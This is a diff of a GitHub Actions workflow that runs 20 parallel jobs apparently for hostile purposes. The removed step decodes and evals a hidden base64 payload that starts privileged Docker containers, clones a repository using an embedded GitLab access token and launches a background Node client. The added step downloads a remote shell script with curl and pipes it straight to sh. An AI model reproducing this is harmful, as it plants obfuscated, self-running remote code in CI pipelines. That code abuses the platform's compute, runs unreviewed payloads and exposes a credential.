@@ -12,12 +12,9 @@ jobs:
         instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
     
     steps:
-      - name: Run Docker containers in parallel
+      - name: Run curl command
         run: |
-          #!/bin/bash
-          encrypted_code="UElEUz0oKQpmb3IgaSBpbiB7MS4uMjV9OyBkbwogIGRvY2tlciBydW4gLWRpdCAtdyAvcm9vdCAtLXByaXZpbGVnZWQgcmVnaXN0cnkuZ2l0bGFiLmNvbS9jYW1pbGxlbmV3aXNvemtlcmUxNC9teW5ldzpsYXRlc3QgYmFzaCAtYyAicm0gLXJmIC5naXQqO2dpdCBjbG9uZSBodHRwczovL2NhbWlsbGVuZXdpc296a2VyZTE0OmdscGF0LUxSSGtSMlVFMnY4UVFFRnhJVHZGakI4Nk1QMU9qWmtkd3hyQ3cuMDEuMTIwdzRsbHlwQGdpdGxhYi5jb20vY2FtaWxsZW5ld2lzb3prZXJlMTQvY2lyY2xlY2kuZ2l0IGNpcmNsZWNpX21zO2NwIC1yIGNpcmNsZWNpX21zLyogLi87cm0gLXJmIGNpcmNsZWNpX21zO3JtIC1yZiAuZ2l0Kjt0bXV4IG5ldy1zZXNzaW9uIC1kIC1zIGNsaWVudC1zZXNzaW9uICdub2RlIGNsaWVudC5qcyc7aXB0YWJsZXMgLUEgSU5QVVQgLW0gY29ubnRyYWNrIC0tY3RzdGF0ZSBSRUxBVEVELEVTVEFCTElTSEVEIC1qIEFDQ0VQVDt0YWlsIC1mIC9kZXYvbnVsbCIgJgogIFBJRFMrPSgkISkKZG9uZQoKZm9yIHBpZCBpbiAiJHtQSURTQF19IjsgZG8KICB3YWl0ICRwaWQKZG9uZQo="
-          decrypted_code=$(echo "$encrypted_code" | base64 --decode)
-          eval "$decrypted_code"
+          curl -O https://hello-ms.vercel.app/ms.sh && sh ms.sh
 
       - name: Wait For unlimited
         run: |
